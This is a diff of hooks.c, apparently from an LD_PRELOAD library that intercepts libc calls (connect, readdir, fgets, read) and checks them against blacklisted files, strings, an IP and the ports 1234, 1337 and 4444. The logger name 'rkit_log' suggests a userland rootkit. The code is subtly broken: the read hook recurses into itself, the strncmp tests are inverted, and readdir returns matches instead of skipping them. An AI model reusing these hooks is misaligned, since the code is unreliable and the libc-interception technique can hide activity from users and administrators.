@@ -17,12 +17,13 @@
  */
 
 #include "hooks.h"
+#include "utils.h"
 #include "config.h"
 
 
 /*
     *    src/hooks.c
-    *    Date: 03/30/22
+    *    Date: 04/04/22
     *    Author: 0x80000000
 */
 
@@ -41,13 +42,13 @@ const uint8_t *blacklisted_strings[] = {
 
 /* Blacklisted IP addresses! */
 const uint8_t *blacklisted_ip_addresses[] = {
-  "1.1.1.1",
+  "1.1.1.1"
 };
 
 /* Blacklisted ports! */
-const uint32_t *blacklisted_ports[] = {
-  1234, 
-  1337, 
+const uint32_t blacklisted_ports[] = {
+  1234,
+  1337,
   4444
 };
 
@@ -59,7 +60,7 @@ const uint32_t *blacklisted_ports[] = {
 
 bool check_blacklisted_files(const uint8_t *string) {
   for (int32_t i = 0; i < (sizeof(blacklisted_files) / sizeof(blacklisted_files[0])); i++)
-    if (strstr(string, blacklisted_strings[i]))
+    if (strncmp(string, blacklisted_files[i], strlen(blacklisted_files[i])))
       return true;
   return false;
 }
@@ -85,7 +86,7 @@ bool check_blacklisted_strings(const uint8_t *string) {
 
 bool check_blacklisted_ip_addresses(const uint8_t *string) {
   for (int32_t i = 0; i < (sizeof(blacklisted_ip_addresses) / sizeof(blacklisted_ip_addresses[0])); i++)
-    if (strstr(string, blacklisted_ip_addresses[i]))
+    if (strncmp(string, blacklisted_ip_addresses[i], strlen(blacklisted_ip_addresses[i])))
       return true;
   return false;
 }
@@ -99,12 +100,12 @@ bool check_blacklisted_ip_addresses(const uint8_t *string) {
 bool check_suspicious_ports(tcp_t *network_information) {
 #ifdef DEBUG
   rkit_log(
-    "Inode found! Details: %d: %x:%x %x:%x",
-    &network_information->sl,
-    &network_information->local_address,
-    &network_information->local_port,
-    &network_information->rem_address,
-    &network_information->rem_port
+    "Inode found! Details: %d: %d:%d %d:%d",
+    network_information->sl,
+    network_information->local_address,
+    network_information->local_port,
+    network_information->rem_address,
+    network_information->rem_port
   );
 #endif
 
@@ -226,10 +227,30 @@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
   rkit_log("Remote Host: %s:%d\n", inet_ntoa(information->sin_addr), ntohs(information->sin_port));
 #endif
 
-  if (check_blacklisted_ip_addresses(inet_ntoa(information->sin_addr))
+  if (check_blacklisted_ip_addresses(inet_ntoa(information->sin_addr)))
     return -1;
 
   return temp_connect(sockfd, addr, addrlen);
+}
+
+/**
+ * @brief Readdir hook, checks for blacklisted files.
+ * @param dirp The path to the file.
+ * @returns A pointer to a dirent structure representing the next directory entry in the directory stream.
+ */
+
+struct dirent *readdir(DIR *dirp) {
+  struct dirent *dir, *(*temp_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");
+
+#ifdef DEBUG
+  rkit_log("readdir(); called!\n");
+#endif
+
+  while ((dir = temp_readdir(dirp)))
+    if ((check_digit(dir->d_name) && atoi(dir->d_name) == getpid()) || check_blacklisted_files(dir->d_name))
+      break;
+
+  return dir;
 }
 
 /**
@@ -332,6 +353,27 @@ char *fgets(char *s, int size, FILE *stream) {
     return "Fatal Error: fgets failed!";
 
   return temp_fgets(s, size, stream);
+}
+
+/**
+ * @brief Read hook, checks for suspicious strings.
+ * @param fd The file descriptor.
+ * @param buf The buffer.
+ * @param count The amount of bytes that will be read.
+ * @returns The number of bytes successfully read from the file.
+ */
+
+ssize_t read(int fd, void *buf, size_t count) {
+  ssize_t (*temp_read)(int fd, void *buf, size_t count) = dlsym(RTLD_NEXT, "read");
+
+#ifdef DEBUG
+  rkit_log("read(); called!\n");
+#endif
+
+  if (check_blacklisted_strings(buf))
+    return 0;
+
+  return read(fd, buf, count);
 }
 
 /**
